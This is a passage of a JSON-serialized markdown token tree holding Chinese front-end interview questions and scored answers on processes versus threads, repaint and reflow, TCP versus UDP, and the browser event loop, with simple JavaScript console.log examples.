\\n","task":false,"loose":true,"text":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n","tokens":[{"type":"text","raw":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n","text":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。","tokens":[{"type":"text","raw":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。","text":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。","escaped":false}]}]},{"type":"list_item","raw":"- 由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","task":false,"loose":true,"text":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","tokens":[{"type":"text","raw":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","text":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","tokens":[{"type":"text","raw":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","text":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是重绘和回流及怎么减少重绘和回流？\\n\\n","depth":2,"text":"什么是重绘和回流及怎么减少重绘和回流？","tokens":[{"type":"text","raw":"什么是重绘和回流及怎么减少重绘和回流？","text":"什么是重绘和回流及怎么减少重绘和回流？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n\\n- 回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n\\n","task":false,"loose":true,"text":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n","tokens":[{"type":"text","raw":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n","text":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。","tokens":[{"type":"text","raw":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。","text":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。","escaped":false}]}]},{"type":"list_item","raw":"- 回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","task":false,"loose":true,"text":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","tokens":[{"type":"text","raw":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","text":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","tokens":[{"type":"text","raw":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","text":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## tcp和udp的区别？\\n\\n","depth":2,"text":"tcp和udp的区别？","tokens":[{"type":"text","raw":"tcp和udp的区别？","text":"tcp和udp的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n\\n- CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n\\n- 由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n\\n- TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n\\n- TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n\\n","task":false,"loose":true,"text":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n","tokens":[{"type":"text","raw":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n","text":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。","tokens":[{"type":"text","raw":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。","text":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。","escaped":false}]}]},{"type":"list_item","raw":"- CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n\\n","task":false,"loose":true,"text":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n","tokens":[{"type":"text","raw":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n","text":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。","tokens":[{"type":"text","raw":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。","text":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。","escaped":false}]}]},{"type":"list_item","raw":"- 由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n\\n","task":false,"loose":true,"text":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n","tokens":[{"type":"text","raw":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n","text":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。","tokens":[{"type":"text","raw":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。","text":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。","escaped":false}]}]},{"type":"list_item","raw":"- TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n\\n","task":false,"loose":true,"text":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n","tokens":[{"type":"text","raw":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n","text":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。","tokens":[{"type":"text","raw":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。","text":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。","escaped":false}]}]},{"type":"list_item","raw":"- TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","task":false,"loose":true,"text":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","tokens":[{"type":"text","raw":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","text":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","tokens":[{"type":"text","raw":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","text":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器 Eventloop\\n\\n","depth":2,"text":"浏览器 Eventloop","tokens":[{"type":"text","raw":"浏览器 Eventloop","text":"浏览器 Eventloop","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n\\n- **1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n\\n- **1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n\\n","task":false,"loose":true,"text":"**1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n","tokens":[{"type":"text","raw":"**1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n","text":"**1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题","text":" 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题","escaped":false}]}]},{"type":"list_item","raw":"- **1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n\\n","task":false,"loose":true,"text":"**1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n","tokens":[{"type":"text","raw":"**1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n","text":"**1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为","text":" JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","task":false,"loose":true,"text":"**1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","tokens":[{"type":"text","raw":"**1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n\\n 之后打印","text":"**1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 ","text":" 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 ","escaped":false},{"type":"codespan","raw":"`不得⼩于 4 毫秒`","text":"不得⼩于 4 毫秒"},{"type":"text","raw":"，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","text":"，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconsole.log(\'script start\');\\n\\nsetTimeout(function(){\\n    console.log(\'setTimeout\');\\n},0);\\n\\nconsole.log(\'script end\');\\n```","lang":"js","text":"console.log(\'script start\');\\n\\nsetTimeout(function(){\\n    console.log(\'setTimeout\');\\n},0);\\n\\nconsole.log(\'script end\');"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","task":false,"loose":false,"text":"**1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","tokens":[{"type":"text","raw":"**1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","text":"**1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","text":" 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconsole.log(\'script start\');\\n\\nsetTimeout(function () {\\n    console.log(\'setTimeout\');\\n}, 0);\\n\\nnew Promise((resolve) => {\\n    console.log(\'Promise\')\\n    resolve()\\n}).then(function () {\\n    console.log(\'promise1\');\\n}).then(function () {\\n    console.log(\'promise2\');\\n});\\n\\nconsole.log(\'script end\');\\n\\n// 结果\\n// script start => Promise => script end => promise1 => promise2 => setTime\\n```","lang":"js","text":"console.log(\'script start\');\\n\\nsetTimeout(function () {\\n    console.log(\'setTimeout\');\\n}, 0);\\n\\nnew Promise((resolve) => {\\n    console.log(\'Promise\')\\n    resolve()\\n}).then(function () {\\n    console.log(\'promise1\');\\n}).then(function () {\\n    